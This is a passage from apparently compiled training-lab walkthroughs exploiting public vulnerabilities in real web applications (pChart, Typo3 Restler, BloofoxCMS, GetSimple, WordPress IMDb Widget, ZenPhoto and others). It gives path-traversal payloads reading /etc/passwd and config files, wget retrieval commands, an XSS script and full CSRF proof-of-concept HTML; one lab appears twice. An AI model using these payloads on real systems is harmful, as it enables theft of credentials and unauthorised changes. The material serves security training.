Payload: ​/var/www/html/index.php 
 
Target URL: 
http://brgct3c86j4v7k1n5fh6genc4.asia.attackdefenselabs.com/windows/code.php?file=/var/ww
w/html/index.php 
 
 
 
 
 
 
 
 
 
The source code of “index.php” page was dumped on the web page. 
 
Step 4: ​Modify the payload in the previous step and try to dump the content of “/etc/passwd” 
 
URL: 
http://brgct3c86j4v7k1n5fh6genc4.asia.attackdefenselabs.com/windows/code.php?file=/etc/pass
wd 
 
 
 
The LFI vulnerability only allows files with certain extensions to be included. “/etc/passwd” file 
does not satisfy the condition therefore, the content of “/etc/passwd” file cannot be dumped. 
 
 
 
Step 5: ​Since PHP files can be included, confirm the local file inclusion vulnerability by dumping 
the content of the vulnerable web page “/windows/code.php”. 
 
Since “index.php” page was located at “/var/www/html/index.php”. The absolute path of the 
vulnerable web page will be “/var/www/html/windows/code.php” 
 
URL: 
http://brgct3c86j4v7k1n5fh6genc4.asia.attackdefenselabs.com/windows/code.php?file=/var/ww
w/html/windows/code.php 
 
 
 
The source code of the vulnerable web page was dumped on the web page. 
 
References:  
 
1.
RIPS (​https://github.com/robocoder/rips-scanner​)  
2.
Rips Scanner 0.5 - 'code.php' Local File Inclusion 
(​https://www.exploit-db.com/exploits/39094​)  
 
 
 
 
 
Name 
PChart 
URL 
https://www.attackdefense.com/challengedetails?cid=277  
Type 
Real World Webapps : Local File Inclusion 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
Step 2: ​Search on google “pchart local file inclusion” and look for publically available exploits.  
 
 
 
 
 
 
The exploit db link contains the LFI payload and the information regarding the vulnerable web 
page. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/31173 
 
 
 
Step 3: ​Using the information provided at exploit db link, form the target URL and navigate to it.  
 
Vulnerable Webpage: ​ /examples/index.php 
 
Vulnerable Parameter: ​Script 
 
Payload:​  %2f..%2f..%2fetc/passwd 
 
 
 
Target URL: 
http://codl61hzp8chwzmktirigwcsn.asia.attackdefenselabs.com/examples/index.php?Action=Vie
w&Script=%2f..%2f..%2fetc/passwd 
 
 
The content of “/etc/passwd” file was dumped on the web page. 
 
References:  
 
1.
pChart (​http://www.pchart.net/download​)  
2.
pChart 2.1.3 - Multiple Vulnerabilities (​https://www.exploit-db.com/exploits/31173​)  
 
 
 
 
 
Name 
Typo3 Restler Extension 
URL 
https://www.attackdefense.com/challengedetails?cid=278  
Type 
Real World Webapps : Local File Inclusion 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
Step 2: ​Search on google “Typo3 Restler Extension local file inclusion” and look for publically 
available exploits.  
 
 
 
The exploit db link contains the LFI payload and the information regarding the vulnerable web 
page. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/42985 
 
 
 
 
 
Step 3: ​Using the information provided at exploit db link, form the target URL and navigate to it.  
 
Vulnerable Webpage:  
/typo3conf/ext/restler/vendor/luracast/restler/public/examples/resources/getsource.php 
 
Vulnerable Parameter: ​file 
 
Payload:​  ../../../../../../../LocalConfiguration.php 
 
Target URL: 
http://n4v4t9br59w3j7txyzhud63pn.asia.attackdefenselabs.com/typo3conf/ext/restler/vendor/lura
cast/restler/public/examples/resources/getsource.php?file=../../../../../../../LocalConfiguration.php 
 
 
 
 
 
The content of “LocalConfiguration.php” was dumped on the web page. 
 
Step 4: ​Modify the payload used in previous step and retrieve the content of “/etc/passwd” file  
 
Target URL: 
http://n4v4t9br59w3j7txyzhud63pn.asia.attackdefenselabs.com/typo3conf/ext/restler/vendor/lura
cast/restler/public/examples/resources/getsource.php?file=../../../../../../../../../../etc/passwd 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
The content of “/etc/passwd” file was dumped on the web page. 
 
References:  
 
1.
restler (​https://extensions.typo3.org/extension/restler/​)  
2.
TYPO3 Extension Restler 1.7.0 - Local File Disclosure 
(​https://www.exploit-db.com/exploits/42985​)  
 
 
 
 
 
Name 
BloofoxCMS 
URL 
https://www.attackdefense.com/challengedetails?cid=279  
Type 
Real World Webapps : Local File Inclusion 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
Step 2: ​Search on google “bloofoxcms local file inclusion” and look for publically available 
exploits.  
 
 
 
There are two exploit db link for different version of Bloofox CMS.  
 
Find the version information of Bloofoxcms. 
 
 
 
 
Login to the admin portal of the web application. The admin portal can be accessed by 
navigating to “/admin” directory. (Many web applications have their admin portal at “/admin” 
directory) 
 
 
The login credential of the web application is provided in the challenge description: 
 
●
Username: admin 
●
Password: admin 
 
 
 
The version of BloofoxCMS is 0.5.0 
 
The exploit db link for bloofoxcms version 0.5.0 contains the LFI payload and the information 
regarding the vulnerable web page. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/39032 
 
 
 
Step 3: ​Using the information provided at exploit db link, form the target URL and navigate to it.  
 
Vulnerable Webpage: ​ /admin/index.php 
 
Vulnerable Parameter: ​fileurl 
 
Payload:​  config.php 
 
Target URL: 
http://eoxtbo0xfo4u5d2wkuge9u7bn.asia.attackdefenselabs.com/admin/index.php?mode=settin
gs&page=editor&fileurl=config.php 
 
 
 
The content of “config.php” was dumped on the web page. 
 
Step 4: ​Modify the payload used in previous step and retrieve the content of “/etc/passwd” file  
 
Target URL: 
http://eoxtbo0xfo4u5d2wkuge9u7bn.asia.attackdefenselabs.com/admin/index.php?mode=settin
gs&page=editor&fileurl=../../../../../etc/passwd 
 
 
 
 
 
The content of “/etc/passwd” file was dumped on the web page. 
 
References:  
 
1.
BloofoxCMS (​https://www.bloofox.com/​)  
2.
BloofoxCMS 0.5.0 - 'fileurl' Local File Inclusion 
(​https://www.exploit-db.com/exploits/39032​)  
 
 
 
 
 
Name 
Getsimple CMS 
URL 
https://www.attackdefense.com/challengedetails?cid=280  
Type 
Real World Webapps : Local File Inclusion 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
Step 2: ​Search on google “Getsimple CMS local file inclusion” and look for publically available 
exploits.  
 
 
 
There are two exploit db link for different version of Getsimple CMS.  
 
Find the version information of Getsimple CMS. 
 
Navigate to the admin portal of the web application. The admin portal can be accessed by 
navigating to “/admin” directory. (Many web applications have their admin portal at “/admin” 
directory) 
 
 
 
 
 
 
The version information is revealed below the login portal. The version of Getsimple CMS is 
3.1.2 
 
The exploit db link for Getsimple CMS version 3.1.2 contains the information regarding the 
vulnerable web page. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/37587 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Step 3: ​The user has to authenticate in order to exploit the vulnerability. Login to the admin 
portal of the web application. 
 
The login credentials are provided in the challenge description. 
 
●
Username: admin 
●
Password: password1 
 
 
 
 
 
 
 
 
 
 
 
 
Step 4: ​Using the information provided at exploit db link, form the target URL and navigate to it.  
 
Vulnerable Webpage: ​ /admin/filebrowser.php 
 
Vulnerable Parameter: ​path 
 
Payload:​  ../../../../../../etc/passwd 
 
Target URL: 
http://tydoe1b31q5f6rmwewfge3skb.asia.attackdefenselabs.com/admin/filebrowser.php?path=../
../../../../../etc/passwd 
 
 
 
Since / is appended after “/etc/passwd”. It can be concluded that the “filebrowser.php” script is 
looking for path of a directory and not the path of the file. 
 
Step 5: ​Modify the payload used in previous step to view the files/folders present in “/etc/” 
directory 
 
Target URL: 
http://tydoe1b31q5f6rmwewfge3skb.asia.attackdefenselabs.com/admin/filebrowser.php?path=../
../../../../../etc/ 
 
 
 
All the directories present in “/etc/” folder were listed.  
 
References:  
 
1.
Getsimple CMS  (​http://get-simple.info/download/​)  
2.
Getsimple CMS 3.1.2 - 'path' Local File Inclusion 
(​https://www.exploit-db.com/exploits/37587​)  
 
 
 
 
 
Name 
WordPress IMDb Widget 
URL 
https://www.attackdefense.com/challengedetails?cid=482  
Type 
Real World Webapps : Local File Inclusion 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
 
Step 2: ​Search on google “WordPress IMDb Profile Widget Plugin local file inclusion” and look 
for publically available exploits.  
 
 
 
 
The exploit db link contains the LFI payload and the information regarding the vulnerable web 
page. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/39621 
 
 
 
 
 
 
Step 3: ​Using the information provided at exploit db link, form the target URL and navigate to it.  
 
Vulnerable Webpage: ​ /wp-content/plugins/imdb-widget/pic.php 
 
Vulnerable Parameter: ​url 
 
Payload: ​../../../wp-config.php 
 
Target URL: 
http://43hrtil2hlr9bporchj5ki3ay.asia.attackdefenselabs.com/wp-content/plugins/imdb-widget/pic.
php?url=../../../wp-config.php 
 
 
 
 
 
 
The included PHP script is rendered as an image. 
 
Step 4: ​Download the file using wget and view its content. 
 
Download the file and save it as “output” 
 
Command: ​wget 
"http://43hrtil2hlr9bporchj5ki3ay.asia.attackdefenselabs.com/wp-content/plugins/imdb-widget/pic
.php?url=../../../wp-config.php" -O output 
 
 
 
 
 
 
 
 
 
 
 
 
 
View the content of “output” file. 
 
Command: ​cat output 
 
 
 
The content of “wp-config.php” script was retrieved. 
 
Step 5: ​Modify the payload used in previous step and retrieve the content of “/etc/passwd” file. 
 
Payload: ​../../../../../../../etc/passwd 
 
Command: 
wget 
"http://43hrtil2hlr9bporchj5ki3ay.asia.attackdefenselabs.com/wp-content/plugins/imdb-widget/pic
.php?url=../../../../../../../etc/passwd" -O output 
 
 
 
View the content of “output” file. 
 
Command: ​cat output 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
The content of “/etc/passwd” file was retrieved. 
 
References:  
 
1.
imdb-widget (​https://wordpress.org/plugins/imdb-widget/​) 
 
2.
WordPress Plugin IMDb Profile Widget 1.0.8 - Local File Inclusion 
(​https://www.exploit-db.com/exploits/39621​)  
 
 
 
 
 
Name 
PHP Webcam Conference 
URL 
https://www.attackdefense.com/challengedetails?cid=483  
Type 
Real World Webapps : Local File Inclusion 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
Note: ​For this challenge, the flash plugin of the browser need to be enabled. 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
The challenge requires flash player to be enabled. Click on the “OK” button on the popup. 
 
 
 
Click on the link: “​http://get.adobe.com/flashplayer/​” and click on the “Allow” button on the “Run 
Flash” popup. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Provided that the flash player is already installed. In case of Mozilla firefox, it won’t be required 
to enable flash player. The above web page will be opened directly. 
 
Step 2: ​Search on google “PHP Webcam Conference local file inclusion exploit db” and look for 
publically available exploits.  
 
 
 
 
 
 
 
 
 
 
 
 
 
 
The exploit db link contains the information regarding the vulnerable parameter and the target 
URL. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/31458 
 
 
 
 
 
 
 
Step 3: ​Click on “Enter Chat” button and enter the chat room. 
 
 
 
 
 
 
Chat Room: 
 
 
 
Step 4: ​Using the information provided at exploit db link, form the target URL and navigate to it.  
 
Vulnerable Webpage: ​ rtmp_login.php 
 
Vulnerable Parameter: ​s 
 
Target URL: 
http://hpctw6bfwryoo6gayzk0gzt9t.asia.attackdefenselabs.com/rtmp_login.php?s=../../../../../etc/p
asswd 
 
 
 
 
 
 
The content of “/etc/passwd” file was dumped on the web page. 
 
References:  
 
1.
PHP-Webcam-Video-Conference 
(​https://github.com/videowhisper/PHP-Webcam-Video-Conference​)  
2.
PHP Webcam Video Conference - Multiple Vulnerabilities 
(​https://www.exploit-db.com/exploits/31458​)  
 
 
 
 
 
Name 
Zen Photo 
URL 
https://www.attackdefense.com/challengedetails?cid=484  
Type 
Real World Webapps : Local File Inclusion 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
Note: ​For this challenge, the flash plugin of the browser need to be enabled. 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
Step 2: ​Search on google “zen photo local file inclusion” and look for publically available 
exploits.  
 
 
 
 
 
The exploit db link contains the information regarding the vulnerable parameter and the target 
URL. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/38841  
 
 
 
 
 
 
 
 
 
 
The LFI payload provided at exploit db link is “../../../xampp/phpinfo”. The payload will include 
the phpinfo script present on the web server. 
 
Since the “php” extension was not mentioned in the payload, It can be concluded that the “php” 
extension is appended automatically to the filename passed in parameter. Therefore only the 
scripts ending with “php” extension can be included.  
 
Null Byte injections can be performed to include files with different extension. However, null byte 
injection will not work on PHP version 5.3.4 and later.  
 
 
 
 
 
 
Step 3: ​Check whether phpinfo.php script exists on the webserver. 
 
URL: ​http://yzdugrk9xen2frxfwgu1rp21q.us-east2.attackdefenselabs.com/phpinfo.php 
 
 
 
The PHP version is 5.5.9, therefore Null Byte injection will not work. 
 
Step 4: ​ Exploit the LFI vulnerability. 
 
The phpinfo script is present in the web root directory and the vulnerable PHP script is present 
in directory “zp-core”. Modify the payload provided at exploit db link accordingly to include the 
“phpinfo.php” script. 
 
Vulnerable Webpage: ​ /zp-core/pluginDoc.php 
 
Vulnerable Parameter: ​extension 
 
Payload:​ ../phpinfo 
 
Target URL: 
http://yzdugrk9xen2frxfwgu1rp21q.us-east2.attackdefenselabs.com/zp-core/pluginDoc.php?third
party=1&extension=../phpinfo 
 
 
 
 
 
 
The phpinfo.php script was included through the vulnerable web page. 
 
Include the index.php script: 
 
URL: 
http://yzdugrk9xen2frxfwgu1rp21q.us-east2.attackdefenselabs.com/zp-core/pluginDoc.php?third
party=1&extension=../index 
 
 
 
The index.php script was included through the vulnerable web page. 
 
References:  
 
1.
Zenphoto (​https://www.zenphoto.org/​)  
2.
ZenPhoto 1.4.10 - Local File Inclusion 
(​https://www.exploit-db.com/exploits/38841​)  
 
 
 
 
 
Name 
ArticleSetup 
URL 
https://www.attackdefense.com/challengedetails?cid=283  
Type 
Real World Webapps : Reflected XSS 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
Step 2: ​Search on google “ArticleSetup exploit”. 
 
 
 
The exploit db link contains the information regarding the vulnerable parameter required to 
exploit the vulnerability. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/28564  
 
 
 
 
 
 
 
 
 
Step 3: ​Inject the XSS payload in the search.  
 
Payload: ​<script>alert('XSS')</script> 
 
URL: ​http://byzg3d9fwefca73v56y16z2un.india-mumbai.attackdefenselabs.com/  
 
 
 
Step 4: ​Press enter or click on search and the XSS payload will be executed.  
 
 
 
 
References:  
 
1.
ArticleSetup (​http://www.articlesetup.com/​)  
2.
ArticleSetup - Multiple Vulnerabilities (​https://www.exploit-db.com/exploits/28564​)  
 
 
 
Name 
Spacemarc News 
URL 
https://www.attackdefense.com/challengedetails?cid=288  
Type 
Real World Webapps : CSRF 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
Step 2: ​Search on google “Spacemarc News exploit” and look for publicly available exploits. 
 
 
 
The exploit db link contains the HTML script required to exploit the vulnerability. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/40493  
 
 
 
 
 
 
 
 
 
 
Step 3: ​The user has to authenticate in order to exploit the vulnerability. The login credentials 
are provided in the challenge description. Navigate to the admin login portal. 
 
URL: ​http://1gy80jl9ot9mjo8h5qsezfjkm.mumbaix.attackdefenselabs.com/admin/ 
 
 
 
●
Username: ​admin@gmail.com 
●
Password​: password 
 
Admin Dashboard: 
 
 
 
Step 4: ​Copy the HTML script provided at exploit db link and update the URL in the ajax 
request.  
 
HTML Script: 
 
<html> 
  <!-- CSRF PoC --> 
  <body> 
<script> 
 
function submitRequest() 
 
{ 
 
var xhr = new XMLHttpRequest(); 
 
xhr.open("POST", 
"http://1gy80jl9ot9mjo8h5qsezfjkm.mumbaix.attackdefenselabs.com/admin/inserisci.php", true); 
 
xhr.setRequestHeader("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"); 
 
xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5"); 
 
xhr.setRequestHeader("Content-Type", 
"multipart/form-data;boundary=---------------------------7815509202030471153167006625"); 
 
xhr.withCredentials = true; 
 
var body ="-----------------------------7815509202030471153167006625\r\n" + 
 
"Content-Disposition: form-data; name=\"titolo\"\r\n" + 
 
"\r\n" + 
 
"MavilerTester\r\n" + 
 
"-----------------------------7815509202030471153167006625\r\n" + 
 
"Content-Disposition: form-data; name=\"im\"\r\n" + 
 
"\r\n" + 
 
"IM\r\n" + 
 
"-----------------------------7815509202030471153167006625\r\n" + 
 
"Content-Disposition: form-data; name=\"size\"\r\n" + 
 
"\r\n" + 
 
"Normale\r\n" + 
 
"-----------------------------7815509202030471153167006625\r\n" + 
 
"Content-Disposition: form-data; name=\"color\"\r\n" + 
 
"\r\n" + 
 
"Color\r\n" + 
 
"-----------------------------7815509202030471153167006625\r\n" + 
 
"Content-Disposition: form-data; name=\"helpbox\"\r\n" + 
 
"\r\n" + 
 
"[u]text[/u]\r\n" + 
 
"-----------------------------7815509202030471153167006625\r\n" + 
 
"Content-Disposition: form-data; name=\"testo\"\r\n" + 
 
"\r\n" + 
 
"tester\r\n" + 
 
"-----------------------------7815509202030471153167006625\r\n" + 
 
"Content-Disposition: form-data; name=\"immagine\"\r\n" + 
 
"\r\n" + 
 
"\r\n" + 
 
"-----------------------------7815509202030471153167006625\r\n" + 
 
"Content-Disposition: form-data; name=\"userfile\";filename=\"\"\r\n" + 
 
"Content-Type: application/octet-stream\r\n" + 
 
"\r\n" + 
 
"\r\n" + 
 
"-----------------------------7815509202030471153167006625\r\n" + 
 
"Content-Disposition: form-data; name=\"letture\"\r\n" + 
 
"\r\n" + 
 
"0\r\n" + 
 
"-----------------------------7815509202030471153167006625\r\n" + 
 
"Content-Disposition: form-data; name=\"categoria\"\r\n" + 
 
"\r\n" + 
 
"1\r\n" + 
 
"-----------------------------7815509202030471153167006625\r\n" + 
 
"Content-Disposition: form-data; name=\"abilita_commenti\"\r\n" + 
 
"\r\n" + 
 
"on\r\n" + 
 
"-----------------------------7815509202030471153167006625\r\n" + 
 
"Content-Disposition: form-data; name=\"notifica_commenti\"\r\n"+ 
 
"\r\n" + 
 
"on\r\n" + 
 
"-----------------------------7815509202030471153167006625\r\n" + 
 
"Content-Disposition: form-data; name=\"submit\"\r\n" + 
 
"\r\n" + 
 
"Inserisci\r\n" + 
 
"-----------------------------7815509202030471153167006625--\r\n"; 
 
var aBody = new Uint8Array(body.length); 
 
for (var i = 0; i < aBody.length; i++) 
 
aBody[i] = body.charCodeAt(i); 
 
xhr.send(new Blob([aBody])); 
 
} 
 
submitRequest(); 
</script> 
<form action="#"> 
 
<input type="button" value="Submit request" onclick="submitRequest();" /> 
</form> 
  </body> 
</html> 
 
Save the HTML script as csrf.html 
 
 
 
 
 
 
Step 5: ​Open the HTML script in the same browser session. 
 
 
 
Click on the “Submit request” button. 
 
Step 6: ​Check the home page of the web application. 
 
URL: ​http://1gy80jl9ot9mjo8h5qsezfjkm.mumbaix.attackdefenselabs.com/ 
 
 
 
The CSRF was successful and as a result 2 news were posed.  
 
 
 
 
References:  
 
1.
Spacemarc News (​http://www.spacemarc.it​)  
2.
Spacemarc News - Cross-Site Request Forgery (Add New Post) 
 (​https://www.exploit-db.com/exploits/40493​)  
 
 
 
Name 
Pluck CMS 
URL 
https://www.attackdefense.com/challengedetails?cid=286  
Type 
Real World Webapps : CSRF 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
Step 2: ​Search on google “Pluck CMS vulnerability exploit db” and look for publicly available 
exploits. 
 
 
 
 
 
 
The exploit db link contains the HTML script required to exploit the vulnerability. 
 
Exploit DB Link: ​ ​https://www.exploit-db.com/exploits/40566 
 
 
 
Step 3: ​The user has to authenticate in order to exploit the vulnerability. The login credentials 
are provided in the challenge description. Navigate to the admin login portal and login to the 
web application 
 
URL: ​http://twpz3rochklct6tlrlejqi6pi.mumbaix.attackdefenselabs.com/login.php 
 
 
Credentials: 
 
●
Password​: password 
 
Admin Dashboard: 
 
 
 
 
Step 4: ​Navigate to “Pages” section. 
 
 
 
Step 5: ​Copy the HTML script provided at exploit db link and update the URL in the request.  
 
HTML Script: 
 
             ​ ​<html> 
  <!-- CSRF PoC --> 
  <body> 
    <form 
action="http://twpz3rochklct6tlrlejqi6pi.mumbaix.attackdefenselabs.com/admin.php?action=editp
age" method="POST"> 
      <input type="hidden" name="title" value="%s" /> 
      <input type="hidden" name="seo&#95;name" value="" /> 
      <input type="hidden" name="content" value="%s" /> 
      <input type="hidden" name="description" value="" /> 
      <input type="hidden" name="keywords" value="" /> 
      <input type="hidden" name="hidden" value="no" /> 
      <input type="hidden" name="sub&#95;page" value="" /> 
      <input type="hidden" name="theme" value="default" /> 
      <input type="hidden" name="save" value="Save" /> 
      <input type="submit" value="Submit request" /> 
    </form> 
  </body> 
</html> 
 
Save the HTML script as csrf.html 
 
 
 
Step 6: ​Open the HTML script in the same browser session. 
 
 
 
 
Step 7: ​Click on “Submit request” and reload the “pages” section to see the effect. 
 
 
 
 
 
 
 
 
 
 
 
 
 
The CSRF was successful and as a result, a new page was added.  
 
 
References:  
 
1.
Pluck CMS  (​http://www.pluck-cms.org/?file=download​)  
2.
Pluck CMS 4.7.3 - Cross-Site Request Forgery (Add Page) 
(​https://www.exploit-db.com/exploits/40566​)  
 
 
 
Name 
Spacemarc News 
URL 
https://www.attackdefense.com/challengedetails?cid=288  
Type 
Real World Webapps : CSRF 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
Step 2: ​Search on google “Spacemarc News exploit” and look for publicly available exploits. 
 
 
 
The exploit db link contains the HTML script required to exploit the vulnerability. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/40493  
 
 
 
 
 
 
 
 
 
 
Step 3: ​The user has to authenticate in order to exploit the vulnerability. The login credentials 
are provided in the challenge description. Navigate to the admin login portal. 
 
URL: ​http://1gy80jl9ot9mjo8h5qsezfjkm.mumbaix.attackdefenselabs.com/admin/ 
 
 
 
●
Username: ​admin@gmail.com 
●
Password​: password 
 
Admin Dashboard: 
 
 
 
Step 4: ​Copy the HTML script provided at exploit db link and update the URL in the ajax 
request.  
 
HTML Script: 
 
<html> 
  <!-- CSRF PoC --> 
  <body> 
<script> 
 
function submitRequest() 
 
{ 
 
var xhr = new XMLHttpRequest(); 
 
xhr.open("POST", 
"http://1gy80jl9ot9mjo8h5qsezfjkm.mumbaix.attackdefenselabs.com/admin/inserisci.php", true); 
 
xhr.setRequestHeader("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"); 
 
xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5"); 
 
xhr.setRequestHeader("Content-Type", 
"multipart/form-data;boundary=---------------------------7815509202030471153167006625"); 
 
xhr.withCredentials = true; 
 
var body ="-----------------------------7815509202030471153167006625\r\n" + 
 
"Content-Disposition: form-data; name=\"titolo\"\r\n" + 
 
"\r\n" + 
 
"MavilerTester\r\n" + 
 
"-----------------------------7815509202030471153167006625\r\n" + 
 
"Content-Disposition: form-data; name=\"im\"\r\n" + 
 
"\r\n" + 
 
"IM\r\n" + 
 
"-----------------------------7815509202030471153167006625\r\n" + 
 
"Content-Disposition: form-data; name=\"size\"\r\n" + 
 
"\r\n" + 
 
"Normale\r\n" + 
 
"-----------------------------7815509202030471153167006625\r\n" + 
 
"Content-Disposition: form-data; name=\"color\"\r\n" + 
 
"\r\n" + 
 
"Color\r\n" + 
 
"-----------------------------7815509202030471153167006625\r\n" + 
 
"Content-Disposition: form-data; name=\"helpbox\"\r\n" + 
 
"\r\n" + 
 
"[u]text[/u]\r\n" + 
 
"-----------------------------7815509202030471153167006625\r\n" + 
 
"Content-Disposition: form-data; name=\"testo\"\r\n" + 
 
"\r\n" + 
 
"tester\r\n" + 
 
"-----------------------------7815509202030471153167006625\r\n" + 
 
"Content-Disposition: form-data; name=\"immagine\"\r\n" + 
 
"\r\n" + 
 
"\r\n" + 
 
"-----------------------------7815509202030471153167006625\r\n" + 
 
"Content-Disposition: form-data; name=\"userfile\";filename=\"\"\r\n" + 
 
"Content-Type: application/octet-stream\r\n" + 
 
"\r\n" + 
 
"\r\n" + 
 
"-----------------------------7815509202030471153167006625\r\n" + 
 
"Content-Disposition: form-data; name=\"letture\"\r\n" + 
 
"\r\n" + 
 
"0\r\n" + 
 
"-----------------------------7815509202030471153167006625\r\n" + 
 
"Content-Disposition: form-data; name=\"categoria\"\r\n" + 
 
"\r\n" + 
 
"1\r\n" + 
 
"-----------------------------7815509202030471153167006625\r\n" + 
 
"Content-Disposition: form-data; name=\"abilita_commenti\"\r\n" + 
 
"\r\n" + 
 
"on\r\n" + 
 
"-----------------------------7815509202030471153167006625\r\n" + 
 
"Content-Disposition: form-data; name=\"notifica_commenti\"\r\n"+ 
 
"\r\n" + 
 
"on\r\n" + 
 
"-----------------------------7815509202030471153167006625\r\n" + 
 
"Content-Disposition: form-data; name=\"submit\"\r\n" + 
 
"\r\n" + 
 
"Inserisci\r\n" + 
 
